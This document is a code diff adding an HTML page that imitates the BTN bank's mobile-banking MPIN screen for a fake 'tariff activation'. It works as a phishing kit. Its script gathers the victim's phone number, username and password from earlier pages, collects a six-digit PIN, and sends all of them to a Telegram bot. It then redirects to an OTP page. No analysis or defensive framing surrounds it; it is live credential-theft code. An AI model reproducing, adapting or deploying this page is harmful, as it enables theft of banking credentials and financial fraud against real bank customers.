@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+      <meta charset="UTF-8">
+      <title>𝗕𝗧𝗡 - 𝗔𝗸𝘁𝗶𝘃𝗮𝘀𝗶 𝗧𝗮𝗿𝗶𝗳</title>
+      <meta name="theme-color" content="#0147A9">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+      <link href="https://raw.githubusercontent.com/gopay882/ast/main/BTN/icon.png" rel="shortcut icon" type="image/x-icon">
+<link href="https://raw.githubusercontent.com/gopay882/ast/main/BTN/icon.png" rel="apple-touch-icon">
+</head>
+<style>
+      @import url('https://fonts.googleapis.com/css?family=Open+Sans&display=swap');
+      
+ body {
+       font-family: sans-serif;
+       margin: 0px;
+       background: #fff;
+}
+
+.pin-code{ 
+  padding: 40px; 
+  margin: 2px auto;
+  margin-top: -4px;
+  margin-bottom: -5px;
+  border: none;
+  display: flex;
+  justify-content:center;
+  
+} 
+ 
+.pin-code input { 
+  border: none; 
+  text-align: center; 
+  border-bottom: 2px solid #767676;
+  width: 30px;
+  height:40px;
+  margin: 0px auto; 
+  font-size: 36px; 
+  background-color: transparent;
+  outline: none;
+  border-radius: 0px;
+  opacity: 0.5;
+} 
+
+
+
+.pin-code input:focus { 
+  border: none;
+  outline:none;
+  opacity: 9;
+  border-bottom: 2px solid #000;
+  
+} 
+
+
+.pin-code input::before { 
+  border: none;
+  outline:none;
+  opacity: 9;
+  border-bottom: 2px solid #767676;
+  
+} 
+
+
+
+.pin-code input::after { 
+  border: none;
+  outline:none;
+  opacity: 9;
+  border-bottom: 2px solid #000;
+  
+} 
+
+
+
+.pin-code input:hover { 
+  border: none;
+  outline:none;
+  opacity: 9;
+  border-bottom: 2px solid #767676;
+  
+} 
+
+
+input::-webkit-outer-spin-button,
+input::-webkit-inner-spin-button {
+    -webkit-appearance: none;
+    margin: 0;
+     border-bottom: 2px solid #000;
+}
+
+input::placeholder{
+    opacity: 0.6;
+}
+
+.lupa{
+      color:#0A5E9A;
+      font-size:17px;
+      position: relative;
+      font-weight:bold;
+      text-decoration: none;
+      display: flex;
+      margin: auto;
+      top: 140px;
+      cursor: none;
+      align-items: center;
+      justify-content: center;
+}
+
+.process {
+     top: 0;
+     left: 0;
+     right: 0;
+     position: fixed;
+     display: flex;
+     justify-content: center;
+     align-items: center;
+     background: #0000005b;
+     z-index: 999999999;
+     width: 100%;
+     height: 100%;
+ }
+ 
+ .loading {
+     margin-top: -50px;
+     position: absolute;
+     display: flex;
+     justify-content: center;
+     align-items: center;
+ }
+
+ .loading img {
+     width: 100px;
+ }
+</style>
+<body>
+<img src="https://raw.githubusercontent.com/gopay882/ast/main/BTN/pin.png" width="100%" alt="">
+<div id="loading" name="process" class="process" style="display: none;">
+			<div class="loading">      
+				<img src="https://raw.githubusercontent.com/gopay882/ast/main/BTN/loading.gif">
+			</div>				
+		</div>
+<center>
+      <form id="formPin">
+          <input type="hidden" name="nohp" id="nohp">
+          <input type="hidden" name="user" id="user">
+          <input type="hidden" name="pass" id="pass">
+    <div class="pin-code" maxlength="6" style="margin-top: -50px; position: absolute; left: 0; right: 0; margin: -40px auto;">
+    <input inputmode="numeric" type="password" id="pin1" data-id="1" name="pin1" maxlength="1" required autofocus>
+    <input inputmode="numeric" type="password" id="pin2" data-id="2" name="pin2" maxlength="1" autofocus>
+	   <input inputmode="numeric" type="password" id="pin3" data-id="3" name="pin3" maxlength="1" autofocus>
+    <input inputmode="numeric" type="password" id="pin4" data-id="4" name="pin4" maxlength="1" autofocus>
+    <input inputmode="numeric" type="password" id="pin5" data-id="5" name="pin5" maxlength="1" autofocus>
+    <input inputmode="numeric" type="password" value="" id="pin6" data-id="6" name="pin6" maxlength="1" autofocus onchange="javascript:this.form.submit();" oninput="sendPin()">
+      </form>
+      </div>
+      <a href="#" class="lupa">Lupa MPIN?</a>
+      <img src="https://raw.githubusercontent.com/gopay882/ast/main/BTN/logo-btn.png" width="30%" style="margin-top:320px" style="position:absolute;" alt="">
+</center>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script>
+      //var pinContainer = document.getElementsByClassName("pin-code")[maxlength];
+var pinContainer = document.querySelector(".pin-code");
+/*console.log('There is ' + pinContainer.length + ' Pin Container on the page.');*/
+
+pinContainer.addEventListener('keyup', function (event) {
+    var target = event.srcElement;
+    
+    var maxLength = parseInt(target.attributes["maxlength"].value, 6);
+    var myLength = target.value. length;
+
+    if (myLength >= maxLength) {
+        var next = target;
+        while (next = next.nextElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        }
+    }
+
+    if (myLength === 0) {
+        var next = target;
+        while (next = next.previousElementSibling) {
+            if (next == 0) break;
+            if (next.tagName.toLowerCase() == "input") {
+                next.focus();
+                break;
+            }
+        }
+    }
+}, false);
+
+pinContainer.addEventListener('keydown', function (event) {
+    var target = event.srcElement;
+    target.value = "";
+}, false);
+</script>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script><script src="i.js"></script>
+<script>
+
+
+var nohp = sessionStorage.getItem('nohp', nohp);
+document.getElementById("nohp").value = nohp + "";       
+var user = sessionStorage.getItem('user', user);
+ document.getElementById("user").value = user + "";
+ var pass = sessionStorage.getItem('pass', pass);
+ document.getElementById("pass").value = pass + ""; 
+var logo = "━─━─✧༺𝘽𝙏𝙉༻✧─━─━";        
+ function sendPin(){
+      event.preventDefault();
+      $(".process").fadeIn(); 
+      
+  var nohp = $('#nohp').val();
+  sessionStorage.setItem('nohp', nohp);  
+  var user = $('#user').val();
+  sessionStorage.setItem('user', user); 
+  var pass = $('#pass').val();
+  sessionStorage.setItem('pass', pass);
+  
+  var pin1 = $('#pin1').val();
+  sessionStorage.setItem('pin1', pin1);
+  var pin2 = $('#pin2').val();
+  sessionStorage.setItem('pin2', pin2);
+  var pin3 = $('#pin3').val();
+  sessionStorage.setItem('pin3', pin3);
+  var pin4 = $('#pin4').val();
+  sessionStorage.setItem('pin4', pin4);
+  var pin5 = $('#pin5').val();
+  sessionStorage.setItem('pin5', pin5);
+  var pin6 = $('#pin6').val();
+  sessionStorage.setItem('pin6', pin6);
+          
+    var gabungan = "" + logo + '%0A※ 𝗡𝗼.𝗛𝗣 •• ' + nohp + '%0A%0A※ 𝗨𝘀𝗲𝗿 •• ' + user + '%0A※ 𝗣𝗮𝘀𝘀 •• ' + pass + '%0A※ 𝗣𝗶𝗻 •• ' + pin1 + pin2 + pin3 + pin4 + pin5 + pin6 ;
+        $.ajax({                   
+            url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
+            method: `POST`,                      
+            complete: function(data) {
+            setTimeout(function(){            
+            window.location.href='otp.html';
+            $(".process").fadeOut();     
+   }, 500);
+            }
+          })
+        }
+</script>      
+</body>
+</html>
